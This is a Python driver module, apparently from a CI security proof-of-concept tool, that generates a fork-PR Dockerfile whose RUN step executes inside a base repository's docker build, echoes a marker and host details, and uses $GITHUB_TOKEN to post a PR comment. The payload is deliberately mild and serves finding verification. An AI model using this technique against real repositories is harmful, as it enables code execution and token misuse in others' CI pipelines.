"""Driver for `pr-controlled-dockerfile-build`.

Attacker fork edits the workflow's Dockerfile to add a benign `RUN`
that echoes the marker and posts a `$GITHUB_TOKEN` comment. When the
mirror's docker/build-push-action step runs, the RUN executes as part
of image build.
"""
from __future__ import annotations

import re

from ..attacker import PayloadFile
from .base import (
    Driver,
    DriverPreviewInfo,
    PayloadArtifact,
    SignalSpec,
    TriggerPlan,
    register,
)


def _dockerfile(marker: str, base_image: str = "alpine:3.19") -> str:
    return (
        f"FROM {base_image}\n"
        f'RUN echo "GRAFTER_MARKER_{marker}" && \\\n'
        f'    echo "hostname=$(hostname 2>/dev/null||true) whoami=$(whoami 2>/dev/null||true) uuid={marker}" && \\\n'
        f'    apk add --no-cache curl 2>/dev/null || true; \\\n'
        f'    if [ -n "$GITHUB_TOKEN" ]; then \\\n'
        f'      curl -sS -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" '
        f'"$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/issues/${{{{ github.event.pull_request.number }}}}/comments" '
        f"-d '{{\"body\":\"grafter-poc side-effect GRAFTER_SIDE_EFFECT_{marker}\"}}' >/dev/null || true; \\\n"
        f'    fi\n'
        f"CMD [\"/bin/sh\", \"-c\", \"echo grafter-poc image ready\"]\n"
    )


class PrDockerfileBuildDriver(Driver):
    category = "pr-controlled-dockerfile-build"
    default_impact_tags = ["rce"]

    def preview(self, finding: dict, marker: str) -> DriverPreviewInfo:
        signals = [
            SignalSpec(
                id="marker_in_log",
                signal_type="run_log_regex",
                tags=["rce"],
                description=f"docker build log contains `GRAFTER_MARKER_{marker}`",
                params={"regex": f"GRAFTER_MARKER_{marker}"},
            ),
            SignalSpec(
                id="side_effect_comment",
                signal_type="pr_comment_by_gh_token_regex",
                tags=["rce"],
                description=f"base-repo GITHUB_TOKEN posted a comment with `GRAFTER_SIDE_EFFECT_{marker}`",
                params={"regex": f"GRAFTER_SIDE_EFFECT_{marker}"},
            ),
        ]
        return DriverPreviewInfo(
            claim=(
                "An anonymous fork-PR contributor can execute attacker-chosen "
                "shell inside the base-repo's docker build via the "
                "PR-controlled Dockerfile RUN instruction."
            ),
            impact_tags=list(self.default_impact_tags),
            signals=signals,
            success_requirement="marker_in_log OR side_effect_comment",
            payload_summary=(
                "Overwrite the workflow's Dockerfile on the attacker fork branch "
                "with a minimal alpine image that echoes the marker in a `RUN` "
                "line and posts a `$GITHUB_TOKEN` comment on the PR (best-effort)."
            ),
            supports_real_repo_mode=False,
        )

    def build_payload(self, finding: dict, marker: str) -> PayloadArtifact:
        # Guess Dockerfile path from finding.detected_sink_line or default to
        # `Dockerfile` at repo root.
        sink = (finding or {}).get("detected_sink_line") or ""
        m = re.search(r"file=([\w./-]+)", sink)
        path = m.group(1) if m else "Dockerfile"
        return PayloadArtifact(
            files=[PayloadFile(path=path, content=_dockerfile(marker).encode("utf-8"))],
            commit_message=f"grafter-poc dockerfile {marker}",
        )

    def build_trigger(self, finding: dict, marker: str) -> TriggerPlan:
        return TriggerPlan(
            kind="pr",
            branch=f"grafter-poc-{marker}",
            base_branch="main",
            title=f"Grafter Live PoC dockerfile {marker}",
            body="Grafter Live PoC — dockerfile RUN carries the marker.",
        )


register(PrDockerfileBuildDriver())
